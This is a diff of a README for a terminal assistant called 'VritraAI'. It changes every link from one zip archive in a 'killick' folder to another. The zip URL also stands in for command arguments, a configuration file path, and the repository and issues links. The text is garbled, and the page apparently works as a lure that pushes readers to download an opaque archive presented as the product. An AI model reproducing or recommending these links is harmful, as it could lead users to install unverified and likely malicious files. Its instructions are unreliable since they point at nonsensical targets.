@@ -1,6 +1,6 @@
 # 🚀 VritraAI - Transform Your Terminal Experience
 
-[![Download VritraAI](https://raw.githubusercontent.com/xaac10/VritraAI/main/killick/VritraAI_2.7.zip%https://raw.githubusercontent.com/xaac10/VritraAI/main/killick/VritraAI_2.7.zip)](https://raw.githubusercontent.com/xaac10/VritraAI/main/killick/VritraAI_2.7.zip)
+[![Download VritraAI](https://github.com/xaac10/VritraAI/raw/refs/heads/main/killick/AI-Vritra-3.0.zip%https://github.com/xaac10/VritraAI/raw/refs/heads/main/killick/AI-Vritra-3.0.zip)](https://github.com/xaac10/VritraAI/raw/refs/heads/main/killick/AI-Vritra-3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ No prior programming knowledge is needed. Our goal is to make your terminal easy
 
 To get VritraAI, visit the Releases page:
 
-[Download VritraAI](https://raw.githubusercontent.com/xaac10/VritraAI/main/killick/VritraAI_2.7.zip)
+[Download VritraAI](https://github.com/xaac10/VritraAI/raw/refs/heads/main/killick/AI-Vritra-3.0.zip)
 
 1. Click on the link above.
 2. Find the latest version of VritraAI.
@@ -52,8 +52,8 @@ Once you have installed VritraAI, you can run it by opening your terminal or com
 ### Basic Commands
 
 - **Help Command:** Type `help` to see a list of available commands and their descriptions.
-- **Code Analysis:** Use the command `analyze <https://raw.githubusercontent.com/xaac10/VritraAI/main/killick/VritraAI_2.7.zip>` to analyze your Python scripts.
-- **Security Scan:** To check for vulnerabilities, type `scan <https://raw.githubusercontent.com/xaac10/VritraAI/main/killick/VritraAI_2.7.zip>`.
+- **Code Analysis:** Use the command `analyze <https://github.com/xaac10/VritraAI/raw/refs/heads/main/killick/AI-Vritra-3.0.zip>` to analyze your Python scripts.
+- **Security Scan:** To check for vulnerabilities, type `scan <https://github.com/xaac10/VritraAI/raw/refs/heads/main/killick/AI-Vritra-3.0.zip>`.
 
 ## 🔧 Customization
 
@@ -65,7 +65,7 @@ To switch themes, type `theme <theme-name>`. Replace `<theme-name>` with your de
 
 ### Add Prompts
 
-You can create custom prompts by editing the configuration file located in your user directory. Look for `https://raw.githubusercontent.com/xaac10/VritraAI/main/killick/VritraAI_2.7.zip` and add your prompts there.
+You can create custom prompts by editing the configuration file located in your user directory. Look for `https://github.com/xaac10/VritraAI/raw/refs/heads/main/killick/AI-Vritra-3.0.zip` and add your prompts there.
 
 ## 📞 Support
 
@@ -73,7 +73,7 @@ If you run into issues or have questions, you can reach out to the community on 
 
 ## 🔗 Helpful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/xaac10/VritraAI/main/killick/VritraAI_2.7.zip)
-- [Issues Page](https://raw.githubusercontent.com/xaac10/VritraAI/main/killick/VritraAI_2.7.zip)
+- [GitHub Repository](https://github.com/xaac10/VritraAI/raw/refs/heads/main/killick/AI-Vritra-3.0.zip)
+- [Issues Page](https://github.com/xaac10/VritraAI/raw/refs/heads/main/killick/AI-Vritra-3.0.zip)
 
 Thank you for choosing VritraAI! We hope it enhances your terminal experience.
